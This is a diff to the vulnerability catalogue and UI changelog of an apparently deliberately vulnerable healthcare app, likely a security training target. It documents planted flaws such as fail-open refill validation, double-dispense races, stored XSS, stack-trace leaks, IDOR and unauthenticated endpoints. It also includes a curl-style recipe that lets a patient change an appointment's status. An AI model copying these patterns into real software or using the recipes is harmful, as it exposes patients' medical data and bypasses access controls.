-| A10 | Mishandling of Exceptional Conditions | `AdminAuditService.java#findById` returns raw stack trace bytes → `AdminLogDetailPage.tsx` renders them via `dangerouslySetInnerHTML` (#159 + #161 chain). **Async Refill Queue feature** (see `A10_FEATURE_PLAN.md`): `RefillQueueService.java` (fail-open promote-to-READY on any validator exception — CWE-636 #128; `catch (Throwable)` around slip printing — CWE-396 #129; `@Scheduled` worker swallows every exception — CWE-755 #130; TOCTOU race on dispense — CWE-362 #131; swallowed `InterruptedException` — CWE-705 #132); `EligibilityValidator.java` (no null check — CWE-754 #133); `V16__create_refill_requests.sql` (schema permits null quantity that triggers the NPE — CWE-665 #134; no UNIQUE constraint for the double-dispense race); `SlipPrinter.java` (write outside try/finally — CWE-460 #135); `RefillRequestDto.java` (raw `failureReason` exception text leaked — CWE-209 #136; absolute `tempSlipPath` leaked #137); `RefillController.java` (`/retry` has no max-retry guard — CWE-400 #138); `SecurityConfig.java` (`/api/refills/**` mapped to `permitAll()` — A01 compounds A10 #139). **Frontend**: `PrescriptionsPage.tsx` (Request Refill button submits `quantity: null` on purpose — feeds the fail-open chain #140); `RefillsPage.tsx` (Dispense button not disabled in-flight — CWE-362 reproducible from UI #141; "Force Concurrent Dispense" button fires 10 parallel calls #142; `failureReason` rendered with `dangerouslySetInnerHTML` — stored XSS pivot #143; Stack-Trace Inspector renders raw exception text + absolute paths — CWE-209 #144); `AdminPage.tsx` + `ProfilePage.tsx` (also render `failureReason` as raw HTML — #143). **Related existing items also touching A10**: `JwtAuthenticationFilter.java` (silently swallows JWT parse exceptions and proceeds as anonymous), `LoggingInterceptor.java` (`ex.printStackTrace(pw)` + logging errors silently swallowed — CWE-209 / CWE-755), `GlobalExceptionHandler.java` (returns raw exception class + message to client). |
+| A10 | Mishandling of Exceptional Conditions | `AdminAuditService.java#findById` returns raw stack trace bytes → `AdminLogDetailPage.tsx` renders them via `dangerouslySetInnerHTML` (#159 + #161 chain). **Async Refill Queue feature**: `RefillQueueService.java` (fail-open promote-to-READY on any validator exception — CWE-636 #128; `catch (Throwable)` around slip printing — CWE-396 #129; `@Scheduled` worker swallows every exception — CWE-755 #130; TOCTOU race on dispense — CWE-362 #131; swallowed `InterruptedException` — CWE-705 #132); `EligibilityValidator.java` (no null check — CWE-754 #133); `V16__create_refill_requests.sql` (schema permits null quantity that triggers the NPE — CWE-665 #134; no UNIQUE constraint for the double-dispense race); `SlipPrinter.java` (write outside try/finally — CWE-460 #135); `RefillRequestDto.java` (raw `failureReason` exception text leaked — CWE-209 #136; absolute `tempSlipPath` leaked #137); `RefillController.java` (`/retry` has no max-retry guard — CWE-400 #138); `SecurityConfig.java` (`/api/refills/**` mapped to `permitAll()` — A01 compounds A10 #139). **Frontend**: `PrescriptionsPage.tsx` (Request Refill button submits `quantity: null` on purpose — feeds the fail-open chain #140); `RefillsPage.tsx` (Dispense button not disabled in-flight — CWE-362 reproducible from UI #141; "Force Concurrent Dispense" button fires 10 parallel calls #142; `failureReason` rendered with `dangerouslySetInnerHTML` — stored XSS pivot #143; Stack-Trace Inspector renders raw exception text + absolute paths — CWE-209 #144); `AdminPage.tsx` + `ProfilePage.tsx` (also render `failureReason` as raw HTML — #143). **Related existing items also touching A10**: `JwtAuthenticationFilter.java` (silently swallows JWT parse exceptions and proceeds as anonymous), `LoggingInterceptor.java` (`ex.printStackTrace(pw)` + logging errors silently swallowed — CWE-209 / CWE-755), `GlobalExceptionHandler.java` (returns raw exception class + message to client). |
+
+---
+
+## UI Scrub Changelog — 2026-06-19
+
+Aesthetic and UX cleanup pass. No backend changes. All backend vulnerabilities and frontend `// [A0X]` source comments preserved intact.
+
+### Patient View — AppointmentsPage.tsx
+
+**Status update control hidden from PATIENT role (backend vuln #43 / #92 intact)**
+
+The "Update status" section in the appointment detail modal is now wrapped with `{!isPatient && (...)}`. PATIENT users no longer see the status dropdown and Update button in the UI.
+
+- `PUT /api/appointments/{id}/status` still accepts any status from any authenticated caller with no role check and no state-machine enforcement (see #43, #92).
+- Demo for PATIENT role: use browser DevTools Network tab or curl with the patient's JWT — `PUT /api/appointments/{id}/status {"status":"APPROVED"}` → 200, status changed.
+- Non-patient roles (DOCTOR, PHARMACIST, LAB_TECH) still see and can use the UI control.
+
+### Patient View — ProfilePage.tsx
+
+**Account Activity card removed from patient profile**
+
+The right-column "Account Activity" card that displayed `failedLoginAttempts`, `lockedUntil`, and `createdAt` has been removed from the patient-facing `/profile` page.
+
+- The underlying data is still returned by `GET /api/users/{id}` in every response (see `UserDto` field exposure at line 248 and IDOR #519). The API-level leak is fully intact.
+- The same fields remain visible in `AdminUserDetailPage.tsx` → Profile card, which is the appropriate surface for security monitoring.
+- No change to any query or mutation; the `userProfile` fetch still runs (it feeds the profile edit form).
+
+### Modal Aesthetic Improvements
+
+`Dialog` component: added `2xl` (`max-w-3xl`) size option.
+
+Updated modals (layout / spacing only, no logic changes):
+
+| Page | Modal | Size change | Content change |
+|---|---|---|---|
+| `AppointmentsPage.tsx` | Detail | `md` → `xl` | Info grid `p-5 gap-x-8 gap-y-5`, `text-sm` values, 2-col edit fields, Cancel+Close+Save merged into one footer row |
+| `AppointmentsPage.tsx` | Create | `md` → `lg` | None |
+| `PrescriptionsPage.tsx` | Detail | `md` → `xl` | Info grid `p-5 gap-x-8 gap-y-5`, `text-sm` values, Dispense+Close merged into footer |
+| `LabResultsPage.tsx` | Detail | `md` → `lg` | Result value `text-3xl`, details grid `p-5 gap-x-8`, notes/attachment separated by divider |
+
+---
+
+## Doctor View — Create Appointment — 2026-06-19
+
+### New Feature
+
+Doctors can now create appointments directly from `DoctorAppointmentsPage.tsx`. A "New Appointment" button opens a modal where the doctor selects a patient from their roster and picks a date/time.
+
+### Vulnerability
+
+**269. [A01] `POST /api/appointments` — doctorId from client state — `DoctorAppointmentsPage.tsx`**
+
+```typescript
+// [A01] doctorId comes from client-side profile state — not re-verified server-side against JWT
+mutationFn: () => api.post('/appointments', {
+  patientId: Number(createForm.patientId),
+  doctorId: doctorId,   // profile.id from GET /doctors/profile — not compared to JWT subject on backend
+  requestedDate: createForm.scheduledAt,
+  notes: createForm.notes,
+})
+```
+
+The create form sends `doctorId` from the client-resolved `profile.id`. The backend `AppointmentController.POST /api/appointments` accepts it verbatim without comparing it to the authenticated principal's doctor profile. A doctor can set `doctorId` to any value (via DevTools or curl) to create an appointment attributed to a different doctor. Compounds with `AppointmentService.java` having no ownership check on subsequent reads/writes (#42, #43, #92).
+
+---
+
+## UI Scrub Changelog — 2026-06-19 (patient modal ID cleanup)
+
+### Scope
+
+Patient-facing detail modals in `PrescriptionsPage.tsx` and `LabResultsPage.tsx` were showing raw internal numeric IDs. These have been hidden for PATIENT role — staff views are unchanged.
+
+### Changes
+
+| File | Field | Before | After |
+|---|---|---|---|
+| `PrescriptionsPage.tsx` | Doctor field fallback | `#${selected.doctorId}` | `'—'` |
+| `PrescriptionsPage.tsx` | Medical Record | `#{selected.medicalRecordId}` always shown | Hidden for PATIENT (`!isPatient` guard) |
+| `PrescriptionsPage.tsx` | Pharmacist | `#{selected.pharmacistId}` shown to patient | Hidden for PATIENT (`!isPatient` guard) |
+| `LabResultsPage.tsx` | Patient ID sub-line | `ID: {r.patientId}` under name | Hidden for PATIENT (`!isPatient` guard) |
+| `LabResultsPage.tsx` | Lab Tech | `ID #{r.labTechId}` shown to patient | Hidden for PATIENT (`!isPatient` guard) |
+
+No new vulnerabilities introduced. No backend changes. Backend still returns all IDs in API responses — this is a UI-only scrub.
